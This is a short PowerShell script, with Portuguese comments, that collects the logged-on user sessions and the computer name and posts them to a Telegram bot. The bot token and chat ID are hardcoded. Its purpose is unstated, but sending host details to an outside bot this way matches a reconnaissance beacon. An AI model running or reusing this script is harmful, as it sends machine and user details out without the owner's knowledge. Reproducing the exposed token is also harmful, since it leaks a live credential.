$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId = "5757392163"

# Obter lista de usuários
# $users = quser | Select-Object -Skip 1 | ForEach-Object {
#     $parts = ($_ -replace "\s{2,}", ",").Split(",")
#     if ($parts.Count -ge 6) {
#         [PSCustomObject]@{
#             UserName    = $parts[0].Trim()
#             SessionName = $parts[1].Trim()
#             ID          = $parts[2].Trim()
#             State       = $parts[3].Trim()
#             IdleTime    = $parts[4].Trim()
#             LogonTime   = $parts[5].Trim()
#         }
#     }
#}

$test = quser
quser | Out-String
Write-Host "$test"

# Pegar apenas o primeiro usuário ativo
#$activeUser = $users | Where-Object { $_.State -eq "Active" } | Select-Object -First 1


    #$userName = $activeUser.UserName.TrimStart('>')
$computerName = $env:COMPUTERNAME



Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
-Method Post `
-ContentType "application/json" `
-Body (@{ chat_id = $chatId; text = "$test" + " " + "$computerName" } | ConvertTo-Json)



exit